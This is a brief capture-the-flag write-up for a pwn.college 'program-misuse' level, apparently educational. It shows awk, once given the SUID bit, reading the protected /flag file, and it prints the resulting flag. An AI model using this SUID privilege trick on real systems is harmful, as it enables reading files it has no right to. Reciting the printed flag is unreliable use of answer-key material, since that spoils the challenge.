`awk`

`awk` is a versatile and powerful scripting language designed for pattern scanning and text processing.

https://www.freecodecamp.org/news/the-linux-awk-command-linux-and-unix-usage-syntax-examples

To print `all` of the contents of a file, the command is :

`awk '{print $0}' file`

This is equivalent to the `cat` command.

```bash
hacker@program-misuse-level-34:~$ cd /
hacker@program-misuse-level-34:/$ cd challenge/
hacker@program-misuse-level-34:/challenge$ ls
babysuid_level34
hacker@program-misuse-level-34:/challenge$ ./babysuid_level34 
Welcome to ./babysuid_level34!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/awk.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level34) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/awk!
hacker@program-misuse-level-34:/challenge$ awk cat /flag
hacker@program-misuse-level-34:/challenge$ ls
babysuid_level34
hacker@program-misuse-level-34:/challenge$ cd /
hacker@program-misuse-level-34:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-34:/$ awk cat /flag
hacker@program-misuse-level-34:/$ awk '{print $0}' /flag
pwn.college{sKHjhieVUYdsqDlkvN-GhnKU_uR.0lN3EDL0AjNzQzW}
```


